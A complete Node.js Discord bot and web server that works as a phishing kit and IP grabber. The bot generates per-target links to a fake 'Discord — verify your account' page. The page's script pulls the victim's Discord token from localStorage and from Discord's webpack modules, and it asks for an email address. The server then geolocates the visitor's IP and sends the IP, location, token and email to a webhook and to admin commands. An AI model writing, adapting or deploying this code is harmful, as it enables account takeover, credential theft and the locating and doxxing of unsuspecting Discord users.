// node 18+ | zero deps beyond discord.js
// file: index.js

import {
  Client, GatewayIntentBits, PermissionFlagsBits, EmbedBuilder,
} from "discord.js";
import { createServer } from "http";
import { readFile, writeFile, access } from "fs/promises";
import { constants } from "fs";
import { URL } from "url";

const TOKEN      = process.env.BOT_TOKEN    ?? "FILL: bot token";
const PORT       = 25689;
const WEBHOOK    = process.env.LOG_WEBHOOK  ?? "FILL: discord webhook url";
const BASE_URL   = process.env.BASE_URL     ?? "https://g0j73tuxuu.apps.bot-hosting.cloud";
const IPINFO_TOK = process.env.IPINFO_TOKEN ?? "";
const LOG_FILE   = "./ip_log.json";
const PREFIX     = "!";

// ── storage ───────────────────────────────────────────────────────────────────
async function loadLog() {
  try {
    await access(LOG_FILE, constants.F_OK);
    return JSON.parse(await readFile(LOG_FILE, "utf8"));
  } catch { return []; }
}
async function appendLog(e) {
  const log = await loadLog();
  log.push(e);
  await writeFile(LOG_FILE, JSON.stringify(log, null, 2));
}
async function wipeLog() {
  await writeFile(LOG_FILE, "[]");
}

// ── geo ───────────────────────────────────────────────────────────────────────
async function geo(ip) {
  try {
    const url = IPINFO_TOK
      ? `https://ipinfo.io/${ip}?token=${IPINFO_TOK}`
      : `https://ipinfo.io/${ip}/json`;
    const r = await fetch(url);
    if (r.ok) return await r.json();
  } catch {}
  try {
    const r = await fetch(
      `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,isp,proxy,hosting,mobile,query`
    );
    const d = await r.json();
    if (d.status === "success") return {
      ip: d.query, city: d.city, region: d.regionName,
      country: d.country, postal: d.zip,
      loc: `${d.lat},${d.lon}`, org: d.isp,
      proxy: d.proxy, hosting: d.hosting, mobile: d.mobile,
    };
  } catch {}
  return {};
}

// ── webhook ───────────────────────────────────────────────────────────────────
async function pingWebhook(entry, g) {
  if (!WEBHOOK || WEBHOOK.startsWith("FILL")) return;
  const maps = g.loc ? `[open](https://www.google.com/maps?q=${g.loc})` : "?";
  const fields = [
    { name: "IP",       value: `\`${entry.ip}\``,              inline: true },
    { name: "UID",      value: `\`${entry.uid ?? "?"}\``,      inline: true },
    { name: "Country",  value: g.country  ?? "?",              inline: true },
    { name: "Region",   value: g.region   ?? "?",              inline: true },
    { name: "City",     value: g.city     ?? "?",              inline: true },
    { name: "Postal",   value: g.postal   ?? "?",              inline: true },
    { name: "Coords",   value: maps,                           inline: true },
    { name: "ISP",      value: g.org      ?? "?",              inline: true },
    { name: "Timezone", value: g.timezone ?? "?",              inline: true },
    { name: "Proxy",    value: String(g.proxy   ?? "?"),       inline: true },
    { name: "Hosting",  value: String(g.hosting ?? "?"),       inline: true },
    { name: "Mobile",   value: String(g.mobile  ?? "?"),       inline: true },
    { name: "UA",       value: `\`${(entry.ua ?? "").slice(0,80)}\``, inline: false },
    ...(entry.token ? [{ name: "🔑 Token", value: `\`${entry.token}\``, inline: false }] : []),
    ...(entry.email ? [{ name: "📧 Email", value: `\`${entry.email}\``,  inline: false }] : []),
  ];
  await fetch(WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [{ title: "🎣 hit", color: 0xff4444, fields, timestamp: new Date().toISOString() }]
    }),
  }).catch(() => {});
}

// ── body parser ───────────────────────────────────────────────────────────────
function readBody(req) {
  return new Promise((res, rej) => {
    let buf = "";
    req.on("data", c => buf += c);
    req.on("end", () => { try { res(JSON.parse(buf)); } catch { res({}); } });
    req.on("error", rej);
  });
}

// ── bait page ─────────────────────────────────────────────────────────────────
function baitPage(uid, to) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Discord — verify your account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#313338;display:flex;align-items:center;justify-content:center;height:100vh;font-family:'gg sans','Noto Sans',sans-serif;color:#dbdee1}
.card{background:#2b2d31;border-radius:8px;padding:32px;width:380px;text-align:center}
h1{color:#fff;font-size:20px;margin-bottom:8px}
p{font-size:14px;color:#949ba4;margin-bottom:24px}
input{width:100%;padding:10px;border-radius:4px;border:1px solid #1e1f22;background:#1e1f22;color:#dbdee1;font-size:14px;margin-bottom:12px;outline:none}
button{width:100%;padding:10px;border:none;border-radius:4px;background:#5865f2;color:#fff;font-size:14px;font-weight:600;cursor:pointer}
.logo{margin-bottom:20px;font-size:36px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">🔒</div>
  <h1>Verify your identity</h1>
  <p>Discord detected unusual activity on your account. Enter your email to continue.</p>
  <input type="email" id="email" placeholder="Email address" autocomplete="email">
  <button onclick="submit()">Verify</button>
</div>
<script>
let _token = null;
try {
  for (const k of Object.keys(localStorage)) {
    const v = localStorage.getItem(k);
    if (typeof v === "string" && /[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{20,}/.test(v)) {
      _token = v; break;
    }
  }
} catch {}
try {
  const wr = window.webpackChunkdiscord_app;
  if (wr) {
    wr.push([[Symbol()],{},(req)=>{
      for(const k of Object.keys(req.c)){
        const m=req.c[k].exports;
        if(m?.default?.getToken){_token=m.default.getToken();return;}
        if(typeof m==="object"){for(const ex of Object.values(m)){if(ex?.getToken){_token=ex.getToken();return;}}}
      }
    }]);
  }
} catch {}

setTimeout(()=>{
  fetch("/hit",{method:"POST",headers:{"Content-Type":"application/json"},
    body:JSON.stringify({uid:"${uid}",ref:"auto",token:_token,email:null})});
},800);

function submit(){
  const email=document.getElementById("email").value.trim();
  fetch("/hit",{method:"POST",headers:{"Content-Type":"application/json"},
    body:JSON.stringify({uid:"${uid}",ref:"submit",token:_token,email:email||null})})
  .then(()=>{ window.location.href="${to}"; });
}
</script>
</body>
</html>`;
}

// ── http server ───────────────────────────────────────────────────────────────
createServer(async (req, res) => {
  const u = new URL(req.url, `http://localhost`);

  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") { res.writeHead(204); res.end(); return; }

  if (req.method === "POST" && u.pathname === "/hit") {
    const body = await readBody(req);
    const ip = (
      req.headers["x-forwarded-for"]?.split(",")[0].trim() ??
      req.socket.remoteAddress
    ).replace("::ffff:", "");

    const entry = {
      ts:    new Date().toISOString(),
      ip,
      ua:    req.headers["user-agent"] ?? "unknown",
      uid:   body.uid   ?? null,
      ref:   body.ref   ?? null,
      token: body.token ?? null,
      email: body.email ?? null,
    };
    const g = await geo(ip);
    entry.geo = g;
    await appendLog(entry);
    await pingWebhook(entry, g);
    console.log("[hit]", entry.ts, ip, g.city, g.country);
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ ok: true }));
    return;
  }

  if (req.method === "GET" && u.pathname === "/") {
    const uid = u.searchParams.get("uid") ?? "";
    const to  = u.searchParams.get("to")  ?? "https://discord.com/app";
    res.writeHead(200, { "Content-Type": "text/html" });
    res.end(baitPage(uid, to));
    return;
  }

  res.writeHead(404); res.end();
}).listen(PORT, "0.0.0.0", () => console.log(`[receiver] :${PORT} on 0.0.0.0`));

// ── discord bot ───────────────────────────────────────────────────────────────
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
  ],
});

client.once("ready", () => console.log(`[logger] online as ${client.user.tag}`));

client.on("messageCreate", async (msg) => {
  if (msg.author.bot || !msg.content.startsWith(PREFIX)) return;
  const [cmd, ...args] = msg.content.slice(PREFIX.length).trim().split(/\s+/);

  if (cmd === "genlink") {
    const target = msg.mentions.users.first() ?? msg.author;
    const to     = args.find(a => a.startsWith("http")) ?? "https://discord.com/app";
    const link   = `${BASE_URL}/?uid=${target.id}&to=${encodeURIComponent(to)}`;
    try {
      await msg.author.send(`🔗 grab link for \`${target.tag}\`:\n${link}`);
      await msg.delete();
    } catch { await msg.reply("open DMs and retry"); }
    return;
  }

  if (cmd === "logs") {
    if (!msg.member?.permissions.has(PermissionFlagsBits.Administrator)) return;
    const n   = parseInt(args[0]) || 20;
    const log = await loadLog();
    if (!log.length) { await msg.reply("no hits yet"); return; }
    let buf = "";
    for (const e of log.slice(-n)) {
      const g = e.geo ?? {};
      const line = [
        `ts=${e.ts}`, `ip=${e.ip}`, `uid=${e.uid ?? "?"}`,
        `city=${g.city ?? "?"}`, `country=${g.country ?? "?"}`,
        e.token ? `token=${e.token.slice(0,20)}…` : null,
        e.email ? `email=${e.email}` : null,
      ].filter(Boolean).join(" | ") + "\n";
      if ((buf + line).length > 1900) {
        await msg.channel.send(`\`\`\`\n${buf}\`\`\``); buf = "";
      }
      buf += line;
    }
    if (buf) await msg.channel.send(`\`\`\`\n${buf}\`\`\``);
    return;
  }

  if (cmd === "lastip") {
    if (!msg.member?.permissions.has(PermissionFlagsBits.Administrator)) return;
    const target = msg.mentions.users.first();
    const log    = await loadLog();
    const hits   = target ? log.filter(e => e.uid === target.id) : log;
    if (!hits.length) { await msg.reply("no hits"); return; }
    const e  = hits[hits.length - 1];
    const g  = e.geo ?? {};
    const maps = g.loc ? `[maps](https://www.google.com/maps?q=${g.loc})` : "?";
    const em = new EmbedBuilder()
      .setTitle(`🎣 ${e.ip}`).setColor(0xff4444)
      .addFields(
        { name: "UID",     value: `\`${e.uid ?? "?"}\``,             inline: true  },
        { name: "Country", value: g.country  ?? "?",                  inline: true  },
        { name: "City",    value: g.city     ?? "?",                  inline: true  },
        { name: "Postal",  value: g.postal   ?? "?",                  inline: true  },
        { name: "Coords",  value: maps,                               inline: true  },
        { name: "ISP",     value: g.org      ?? "?",                  inline: true  },
        { name: "Proxy",   value: String(g.proxy ?? "?"),             inline: true  },
        { name: "UA",      value: `\`${(e.ua ?? "").slice(0,60)}\``,  inline: false },
        ...(e.token ? [{ name: "🔑 Token", value: `\`${e.token}\``,  inline: false }] : []),
        ...(e.email ? [{ name: "📧 Email", value: `\`${e.email}\``,   inline: false }] : []),
      ).setTimestamp(new Date(e.ts));
    await msg.channel.send({ embeds: [em] });
    return;
  }

  if (cmd === "clearlog") {
    if (!msg.member?.permissions.has(PermissionFlagsBits.Administrator)) return;
    await wipeLog();
    await msg.reply("log wiped");
    return;
  }
});

client.login(TOKEN);
